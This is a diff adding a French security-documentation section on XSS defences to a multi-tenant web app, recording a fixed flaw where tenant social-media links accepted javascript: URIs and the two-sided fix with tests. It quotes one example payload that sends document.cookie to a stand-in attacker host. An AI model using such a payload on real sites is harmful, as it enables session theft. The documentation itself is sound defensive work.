@@ -161,6 +161,47 @@ Endpoints dédiés (`rgpd.py`) : droit à l'oubli, export de données,
 consentements. Suppression de compte : demande tracée
 (`account_deletion_requests`), pas de suppression immédiate silencieuse.
 
+## 8. Frontend (XSS)
+
+- Tout HTML fourni par un tenant/utilisateur et injecté via
+  `dangerouslySetInnerHTML` passe par `sanitizeHtml()`
+  (`src/lib/sanitize.ts`, DOMPurify), jamais brut.
+- Tout lien externe fourni par un tenant/utilisateur et injecté dans un
+  attribut `href` passe par `sanitizeUrl()` (même fichier — n'autorise
+  que `http://`, `https://`, `mailto:`, `tel:`, renvoie `"#"` sinon).
+- **Faille corrigée (institutional-readiness audit, 2026-09, 9e
+  balayage)** : les 7 champs de réseaux sociaux de
+  `TenantLandingSettings` (`facebook`, `instagram`, `twitter`, `youtube`,
+  `facebook_url`, `twitter_url`, `linkedin_url`) n'avaient aucune
+  validation de protocole côté backend, et 5 fichiers frontend (les
+  templates de site public — `PublicPageView.tsx`, `PremiumFooter.tsx`,
+  et les 3 templates legacy High School/University/DefaultLanding)
+  injectaient ces valeurs directement dans un `href={...}` sans passer
+  par `sanitizeUrl()`, alors que ce helper est correctement utilisé
+  ailleurs dans les mêmes pages (`Hero.tsx`, `CTA.tsx`). N'importe quel
+  admin de tenant pouvait donc configurer un lien du type
+  `javascript:fetch('https://evil.example/?c='+document.cookie)` :
+  `target="_blank" rel="noopener noreferrer"` bloque l'accès à
+  `window.opener` mais n'empêche pas l'exécution d'une URI
+  `javascript:` au clic. Comme le même domaine sert l'application
+  authentifiée (JWT dans `localStorage`), un membre du personnel
+  prévisualisant son propre site public aurait pu voir son jeton de
+  session exfiltré. Corrigé des deux côtés (défense en profondeur) :
+  les 5 fichiers frontend appliquent désormais `sanitizeUrl()` sur
+  chaque `href` concerné, et `TenantLandingSettings` rejette tout
+  protocole autre que `http(s)://` via un `field_validator` — vérifié
+  au point d'écriture réel (`PATCH /tenants/settings/`, qui acceptait
+  jusqu'ici n'importe quelle clé sans validation), pas seulement côté
+  lecture publique (où l'exception aurait silencieusement vidé tout
+  l'objet `landing` plutôt que de rejeter l'écriture fautive). Testé
+  dans `test_tenant_landing_social_link_javascript_uri_2026_09_28.py`
+  (backend) et `SocialLinksXss.test.tsx` (frontend, les 5 composants
+  exercés directement).
+- Jeton JWT stocké en `localStorage` (`src/api/client.ts`) — compromis
+  classique d'une architecture 100 % Bearer sans cookie ; combiné à une
+  XSS non corrigée, il permettrait le vol de session, d'où l'importance
+  des deux règles ci-dessus.
+
 ## Risques connus (non résolus, hors périmètre de cette session)
 
 - **P1** : vérifier le rôle PostgreSQL de production n'est pas
